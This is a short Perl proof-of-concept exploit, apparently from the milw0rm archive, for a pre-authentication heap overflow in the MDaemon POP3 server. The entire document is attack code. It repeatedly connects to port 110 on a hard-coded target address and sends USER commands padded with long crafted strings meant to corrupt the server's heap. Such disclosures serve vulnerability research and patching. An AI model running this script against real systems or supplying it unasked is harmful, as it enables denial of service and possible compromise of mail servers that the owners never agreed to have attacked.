#
# PoC for Mdaemon POP3 preauth heap overflow
#
# Coded by Leon Juranic <leon.juranic@infigo.hr>
# Infigo IS <http://www.infigo.hr>
# 
#

$host = '192.168.0.105';

use IO::Socket;

for ($x = 0 ; $x < 12 ; $x++)
{
	$sock = new IO::Socket::INET (PeerAddr => $host,PeerPort => '110', Proto => 'tcp') 
	|| die "socket error\n\n";
	recv ($sock, $var, 10000,0);
	print $var;
	print $sock "USER " . "\@A" x 160 . "\r\n";
	recv ($sock, $var, 10000,0);
	print $var;
	print $sock "QUIT\r\n";
	recv ($sock, $var, 10000,0);
	print $var;
	close ($sock);
	sleep(1);
}
	$sock = new IO::Socket::INET (PeerAddr => $host,PeerPort => '110', Proto => 'tcp') 
	|| die "socket error\n\n";
	recv ($sock, $var, 10000,0);
	print $var;
	print $sock "USER " . "\@A\@A" . "B" x 326 . "\r\n";
	recv ($sock, $var, 10000,0);
	print $var;
	print $sock "USER " . "\'A" x  337 . "\r\n";
	recv ($sock, $var, 10000,0);
	print $var;
	sleep(2);

# milw0rm.com [2006-08-22]
